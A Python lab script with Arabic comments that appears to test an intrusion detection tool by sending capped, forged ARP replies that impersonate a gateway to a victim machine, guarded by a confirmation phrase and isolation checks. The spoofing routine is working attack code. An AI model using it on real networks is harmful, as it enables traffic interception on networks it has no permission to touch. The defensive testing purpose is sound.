# -*- coding: utf-8 -*-
"""
سكربت مختبري: توليد مرور ARP مشبوه للتحقق من أداء NetGuard-IDS
==============================================================
⚠️ هذا السكربت يُستخدم فقط داخل مختبر افتراضي معزول تملكه بالكامل
   (VirtualBox/VMware بشبكة داخلية) أو شبكة خاصة بك وبإذن مكتوب.

هذه هي طريقة "الإثبات العملي" المطلوبة في مشروع التخرج:
  جهاز (المهاجم) يرسل 5 ردود ARP مزيفة يدّعي فيها أنه هو البوابة،
  وأداة NetGuard-IDS (الجهاز المراقب) تلتقطها وتُطلق تنبيه MITM.

الاستخدام (مثال داخل المختبر):
  python tests\lab_spoof_sim.py \
     --iface "Ethernet" --gateway-ip 192.168.1.1 \
     --victim-ip 192.168.1.50 \
     --confirm "I OWN THIS LAB"

اختياري:
  --count N               عدد الحزم (حد أقصى 10)
  --attacker-mac XX:..    MAC المهاجم (افتراضيًا ماك الجهاز الحقيقي)
  --cleanup real_gateway_mac   إرسال ردود تصحيحية لاستعادة الجدول بعد النهاية
"""
from __future__ import annotations

import argparse
import sys
import time

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

CONFIRM_PHRASE = "I OWN THIS LAB"
MAX_COUNT = 10


def main():
    ap = argparse.ArgumentParser(description="Offending ARP generator for a PRIVATE LAB only")
    ap.add_argument("--iface", required=True)
    ap.add_argument("--gateway-ip", required=True, help="IP البوابة التي سانتحلها")
    ap.add_argument("--victim-ip", required=True, help="IP الجهاز الذي سيستقبل الردود المزيفة")
    ap.add_argument("--attacker-mac", default=None, help="MAC المهاجم (اختياري = ماك الحقيقي)")
    ap.add_argument("--count", type=int, default=5, help="replies count (capped by guard.lab_traffic_limit)")
    ap.add_argument("--cleanup", default=None, help="real gateway MAC to restore binding after the test")
    ap.add_argument("--confirm", required=True,
                    help=f"must type exactly: {CONFIRM_PHRASE}")
    args = ap.parse_args()

    # safety guards (mandatory per the project plan, section 8)
    from ids_tool.config import load_config
    from ids_tool import guard
    cfg = load_config()
    guard.require_lab_interface(args.iface, cfg)
    guard.require_isolated_network(cfg)
    if args.confirm.strip() != CONFIRM_PHRASE:
        print(f"⛔ access denied: confirm lab ownership with --confirm \"{CONFIRM_PHRASE}\"")
        return 2
    count = max(1, min(args.count, guard.traffic_limit(cfg)))

    from scapy.all import ARP, Ether, conf, sendp
    conf.verb = 0

    def mac_of(ip):
        from scapy.all import getmacbyip
        mac = getmacbyip(ip)
        if not mac:
            raise SystemExit(f"⛔ تعذر إيجاد MAC لـ {ip} — تأكد أن الجهاز على نفس الشبكة.")
        return mac

    attacker_mac = (args.attacker_mac or "").lower() or conf.iface.mac
    victim_mac = mac_of(args.victim_ip)
    frame = (
        Ether(src=attacker_mac, dst=victim_mac)
        / ARP(op=2, psrc=args.gateway_ip, hwsrc=attacker_mac,
              pdst=args.victim_ip, hwdst=victim_mac)
    )

    print("⚠️ اختبار داخل مختبر شخصي فقط! يرسل", count, "ردود ARP مزيفة…")
    sent = 0
    for _ in range(count):
        sendp(frame, iface=args.iface, verbose=0)
        sent += 1
        time.sleep(0.4)
    print(f"✅ تم إرسال {sent} حزمة. راقب تنبيه NetGuard-IDS في الجهاز المراقب.")

    if args.cleanup:
        real_mac = args.cleanup.strip().lower()
        correct = (
            Ether(src=real_mac, dst=victim_mac)
            / ARP(op=2, psrc=args.gateway_ip, hwsrc=real_mac,
                  pdst=args.victim_ip, hwdst=victim_mac)
        )
        time.sleep(5)
        for _ in range(3):
            sendp(correct, iface=args.iface, verbose=0)
            time.sleep(0.2)
        print("♻️ أُرسلت حزم الإصلاح لاستعادة تعيين البوابة.")


if __name__ == "__main__":
    raise SystemExit(main())
